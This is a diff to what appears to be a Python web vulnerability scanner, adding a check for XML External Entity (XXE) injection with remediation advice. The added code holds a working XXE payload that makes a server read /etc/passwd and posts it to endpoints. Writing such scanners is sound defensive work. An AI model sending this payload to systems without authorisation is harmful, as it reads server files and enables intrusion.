@@ -296,6 +296,42 @@ def test_param_url(client: httpx.Client, url: str) -> list[Finding]:
     return findings
 
 
+_XXE_PAYLOAD = (
+    '<?xml version="1.0" encoding="UTF-8"?>\n'
+    '<!DOCTYPE sf [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n'
+    "<sf>&xxe;</sf>"
+)
+_XXE_HINT = re.compile(r"/(api|xml|soap|rpc|service|feed|upload|import|ws)\b", re.I)
+
+
+def test_xxe(client: httpx.Client, base_url: str, param_urls: list[str], max_urls: int = 6) -> list[Finding]:
+    """Send an in-band XXE payload to XML-ish endpoints; flag if a local file leaks."""
+    targets = [base_url] + [u for u in param_urls if _XXE_HINT.search(urlparse(u).path)]
+    seen: set[str] = set()
+    findings: list[Finding] = []
+    for url in targets[:max_urls]:
+        base = url.split("?")[0]
+        if base in seen:
+            continue
+        seen.add(base)
+        try:
+            r = client.post(base, content=_XXE_PAYLOAD.encode(),
+                            headers={"Content-Type": "application/xml"})
+        except httpx.HTTPError:
+            continue
+        if r is not None and PASSWD_RE.search(r.text):
+            findings.append(Finding(
+                check_id="xxe", title="XML External Entity (XXE) Injection", severity="high", url=base,
+                description="The endpoint parses XML with external entities enabled and returns local file contents.",
+                impact="Attackers can read server files, and XXE can escalate to SSRF or denial of service.",
+                evidence="An XXE payload referencing file:///etc/passwd returned OS file contents.",
+                remediation="Disable external entities and DTD processing in the XML parser.",
+                compliance_ref="OWASP A05:2025",
+            ))
+            break
+    return findings
+
+
 def test_host_header(client: httpx.Client, base_url: str) -> list[Finding]:
     """Detect Host header injection — a poisoned Host reflected into the page."""
     try:
